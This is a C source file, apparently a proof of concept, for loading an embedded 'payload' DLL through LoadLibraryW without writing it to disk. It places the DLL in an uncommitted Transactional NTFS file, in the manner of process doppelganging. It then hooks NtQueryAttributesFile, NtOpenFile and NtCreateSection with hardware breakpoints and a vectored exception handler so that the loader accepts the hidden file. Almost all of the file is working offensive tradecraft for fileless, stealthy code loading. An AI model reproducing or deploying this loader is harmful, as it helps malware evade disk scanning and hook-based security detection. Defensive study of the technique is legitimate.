// Bassicly I was thinking of a way to call LoadLibrary without having to let it load a file from disk,
// however since it accepts a file path, I needed to work around that, for that part I was inspired by the doppelganging method,
// and its use of Transactional NTFS, it works bassicaly like that

// - Create an NTFS Transaction
// - Create a File in that Transaction
// - Write the file (this can be embedded into the binary, received from the network, etc ...) into transacted file (only visible to our process)
// - from here we can actually just map the file as an image, and it will be marked as MEM_IMAGE
// - But we want to call LoadLibraryW

// How LoadLibraryW works is that it will create a section and map and then do the normal dll loading process.

// however I faced 3 problems actually

// LoadLibraryW Will

// 1) Attempt to call NtQueryAttributesFile to check if the file exists, and since its inside a transaction that is not commited it will fail.

// 2) Attempt to open a new handle to the file using NtOpenFile, and since the file doesn't exist it will fail, so I need to give it my valid file handle in the ntfs transaction.

// 3) Create a new Section object via NtCreateSection, and here there was a weird issue microsoft cleary says that the page protection field doesn't matter if you are
//    creating a SEC_IMAGE, and it passed PAGE_EXECUTE, this returned STATUS_ACCESS_DENIED.

// I solve these problems by hooking the 3 functions, via hardware breakpoints so we don't modify any pages,
//
// for NtQueryAttributesFile I just tell it that it exists :)

// for NtOpenFile I solve it by tracking the file handles in the transaction and handing those instead of trying to open a new one.

// for NtCreateSection I just replace PAGE_EXECUTE with PAGE_READONLY

#include <phnt_windows.h>
#include <phnt.h>
#include <ktmw32.h>
#include <stdio.h>
#include <strsafe.h>
#include "payload.hpp"

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "KtmW32.lib")

HANDLE hFile = NULL;

#define Array(type)      \
    typedef struct       \
    {                    \
        size_t count;    \
        size_t capacity; \
        type *items;     \
    } type##Array;

#define ArrayInit(arr) (arr)->count = (arr)->capacity = (arr)->items = 0;

#define ArrayAppend(type, arr, item)                                                               \
    do                                                                                             \
    {                                                                                              \
        if ((arr)->count >= (arr)->capacity)                                                       \
        {                                                                                          \
            (arr)->capacity = (arr)->capacity ? (arr)->capacity * 2 : 256;                         \
            (arr)->items = (type *)realloc((arr)->items, sizeof(*(arr)->items) * (arr)->capacity); \
        }                                                                                          \
        (arr)->items[arr->count++] = item;                                                         \
    } while (0)

typedef struct TransactedFile TransactedFile;
Array(TransactedFile) struct TransactedFile
{
    UNICODE_STRING file_path;
    HANDLE handle;
};

typedef void (*HookHandler)(PEXCEPTION_POINTERS);

typedef struct HookedFunc HookedFunc;
Array(HookedFunc) struct HookedFunc
{
    void *func;
    HookHandler hook;
};

TransactedFileArray *tfs;
HookedFuncArray hooked_funcs;
void MarkFileAsTransacted(TransactedFileArray tfs, const wchar_t *file_path, HANDLE handle);
TransactedFile *GetTransactedFile(TransactedFileArray transacted_files, const wchar_t *file_path);
LONG WINAPI Hook(PEXCEPTION_POINTERS ExceptionInfo);
HANDLE CreateFileInTransaction(const wchar_t *file_path);
BOOL SetHWBP(void *address, BOOL set, int index);

BOOL SetHWBP(void *address, BOOL set, int index)
{
    if (index < 0 || index > 3)
    {
        return FALSE;
    }

    CONTEXT context = {0};
    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!GetThreadContext(GetCurrentThread(), &context))
    {
        return FALSE;
    }

    DWORD64 *dr = &context.Dr0;
    dr[index] = (DWORD64)address;

    if (set)
    {
        context.Dr7 |= (1ULL << (index * 2));
        context.Dr7 &= ~(3ULL << (16 + (index * 4)));
        context.Dr7 &= ~(3ULL << (18 + (index * 4)));
    }
    else
    {
        dr[index] = 0;
        context.Dr7 &= ~(1ULL << (index * 2));
    }

    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    return SetThreadContext(GetCurrentThread(), &context);
}

LONG WINAPI Hook(PEXCEPTION_POINTERS ExceptionInfo)
{
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP)
    {
        for (size_t i = 0; i < hooked_funcs.count; i++)
        {
            if (ExceptionInfo->ContextRecord->Rip == hooked_funcs.items[i].func)
            {
                hooked_funcs.items[i].hook(ExceptionInfo);
                break;
            }
        }

        ExceptionInfo->ContextRecord->EFlags |= (1 << 16);
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

TransactedFile *GetTransactedFileByHandle(TransactedFileArray *transacted_files, HANDLE handle)
{
    for (size_t i = 0; i < transacted_files->count; i++)
    {
        if (transacted_files->items[i].handle == handle)
        {
            return &transacted_files->items[i];
        }
    }

    return NULL;
}

TransactedFile *GetTransactedFile(TransactedFileArray *transacted_files, PUNICODE_STRING file_path)
{
    for (size_t i = 0; i < transacted_files->count; i++)
    {
        if (RtlEqualUnicodeString(&transacted_files->items[i].file_path, file_path, TRUE))
        {
            return &transacted_files->items[i];
        }
    }

    return NULL;
}

void MarkFileAsTransacted(TransactedFileArray *tfs, const wchar_t *file_path, HANDLE handle)
{
    TransactedFile tf = {0};
    RtlDosPathNameToNtPathName_U_WithStatus(file_path, &tf.file_path, NULL, NULL);
    tf.handle = handle;
    ArrayAppend(TransactedFileArray, tfs, tf);
}

HANDLE CreateFileInTransaction(const wchar_t *file_path)
{
    HANDLE tran_handle = CreateTransaction(NULL, NULL, 0, 0, 0, INFINITE, NULL);

    HANDLE file_handle = CreateFileTransactedW(
        file_path,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        tran_handle,
        NULL,
        NULL);

    return file_handle;
}

void NtOpenFileHook(PEXCEPTION_POINTERS exp)
{
    POBJECT_ATTRIBUTES objattr = exp->ContextRecord->R8;
    TransactedFile *tf = GetTransactedFile(&tfs, objattr->ObjectName);

    if (tf)
    {
        PHANDLE handle = (PHANDLE)exp->ContextRecord->Rcx;
        PIO_STATUS_BLOCK io_status = (PIO_STATUS_BLOCK)exp->ContextRecord->R9;
        io_status->Status = STATUS_SUCCESS;
        io_status->Information = FILE_OPENED;
        *handle = tf->handle;
        exp->ContextRecord->Rax = STATUS_SUCCESS;
        exp->ContextRecord->Rip += 20;
    }
}

void NtQueryAttributesFileHook(PEXCEPTION_POINTERS exp)
{
    POBJECT_ATTRIBUTES objattr = exp->ContextRecord->Rcx;
    TransactedFile *tf = GetTransactedFile(&tfs, objattr->ObjectName);

    if (tf)
    {
        exp->ContextRecord->Rax = STATUS_SUCCESS;
        exp->ContextRecord->Rip += 20;
    }
}

void NtCreateSectionHook(PEXCEPTION_POINTERS exp)
{
    PULONG page_protection = (PULONG)(exp->ContextRecord->Rsp + 0x28);
    HANDLE file_handle = *(HANDLE *)(exp->ContextRecord->Rsp + 0x38);

    if (GetTransactedFileByHandle(&tfs, file_handle))
    {
        *page_protection = PAGE_READONLY;
    }
}

int main()
{
    TransactedFileArray *tfap = &tfs;
    TransactedFileArray *hooked_funcsp = &tfs;

    ArrayInit(tfap);
    ArrayInit(hooked_funcsp);

    wchar_t tmppath[MAX_PATH + 512] = {0};
    GetTempPathW(MAX_PATH, tmppath);
    StringCchCat(tmppath, MAX_PATH + 512, L"payload.dll");

    HANDLE file_handle = CreateFileInTransaction(tmppath);
    DWORD written = 0;
    BOOL result = WriteFile(file_handle, payload, sizeof payload, &written, NULL);
    MarkFileAsTransacted(tfap, tmppath, file_handle);

    printf("File Handle -> %X\n", file_handle);

    {
        AddVectoredExceptionHandler(0, Hook);
        void *pNtOpenFile = (void *)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenFile");
        void *pNtQueryAttributesFile = (void *)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryAttributesFile");

        // Even though microsoft clearly states the page protection field doesn't affect image sections.
        // it here fails because in ntdll it will NtCreateSection with PAGE_EXECUTE, and it returns STATUS_ACCESS_DENIED ?! on that
        // to fix that we can just replace PAGE_EXECUTE with PAGE_READONLY
        void *pNtCreateSection = (void *)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");

        HookedFunc hfs[] =
            {
                {.func = pNtQueryAttributesFile, .hook = NtQueryAttributesFileHook},
                {.func = pNtOpenFile, .hook = NtOpenFileHook},
                {.func = pNtCreateSection, .hook = NtCreateSectionHook}};

        for (size_t i = 0; i < ARRAYSIZE(hfs); i++)
        {
            HookedFuncArray *hooked_funcsp = &hooked_funcs;
            ArrayAppend(HookedFunc, hooked_funcsp, hfs[i]);
            SetHWBP(hfs[i].func, TRUE, i);
        }
    }

#if 0

    // We can also map manually if we want to !

    HANDLE hImageSection = 0;
    NTSTATUS status = NtCreateSection(
        &hImageSection,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_EXECUTE,
        SEC_IMAGE,
        file_handle
    );

    PVOID baseAddress = NULL;
    SIZE_T viewSize = 0;
    status = NtMapViewOfSection(
        hImageSection,
        GetCurrentProcess(),
        &baseAddress,
        0,
        0,
        NULL,
        &viewSize,
        ViewShare,       
        0,
        PAGE_READONLY
    );

    getchar();
#endif

    LoadLibraryW(tmppath);

    getchar();

    return 0;
}